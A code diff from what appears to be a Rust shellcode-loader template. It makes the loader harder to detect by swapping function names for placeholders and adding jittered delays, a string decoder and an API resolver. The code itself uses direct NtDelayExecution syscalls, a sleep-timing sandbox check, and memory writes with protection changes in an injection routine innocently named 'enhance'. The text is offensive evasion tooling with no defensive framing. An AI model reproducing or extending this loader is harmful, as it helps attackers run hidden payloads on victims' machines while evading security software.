@@ -23,14 +23,18 @@ use std::include_bytes;
 
 {{DECRYPTION_FUNCTION}}
 
-fn pause(ms: i64) {
+{{STR_DECODER}}
+
+{{API_RESOLVER}}
+
+fn {{FN_PAUSE}}(ms: i64) {
     let interval: i64 = -(ms * 10_000);
     let _ = syscall!("NtDelayExecution", 0u32, &interval as *const i64);
 }
 
 fn check_environment() -> bool {
     let start = Instant::now();
-    pause(3000);
+    {{FN_PAUSE}}(3000);
     start.elapsed().as_millis() >= 2500
 }
 
@@ -41,7 +45,7 @@ fn wipe(buf: &mut Vec<u8>) {
     buf.clear();
 }
 
-fn enhance(mut buf: Vec<u8>) {
+fn {{FN_INJECT}}(mut buf: Vec<u8>) {
     unsafe {
         let buf_len = buf.len();
 
@@ -57,7 +61,7 @@ fn enhance(mut buf: Vec<u8>) {
         ).unwrap_or(-1);
         if !NT_SUCCESS(status) { return; }
 
-        pause(150);
+        {{FN_PAUSE}}({{JITTER_1}});
         {{NT_DELAY_STEP}}
 
         let mut bytes_written: usize = 0;
@@ -73,7 +77,7 @@ fn enhance(mut buf: Vec<u8>) {
 
         wipe(&mut buf);
 
-        pause(200);
+        {{FN_PAUSE}}({{JITTER_2}});
         {{NT_DELAY_STEP}}
 
         let mut old_protect: u32 = 0;
@@ -87,7 +91,7 @@ fn enhance(mut buf: Vec<u8>) {
         ).unwrap_or(-1);
         if !NT_SUCCESS(status) { return; }
 
-        pause(100);
+        {{FN_PAUSE}}({{JITTER_4}});
         {{NT_DELAY_STEP}}
         {{NT_DELAY_FINAL}}
 
@@ -113,7 +117,7 @@ fn main() {
 
     {{MAIN}}
 
-    enhance(vec);
+    {{FN_INJECT}}(vec);
 }
 
 {{DLL_MAIN}}
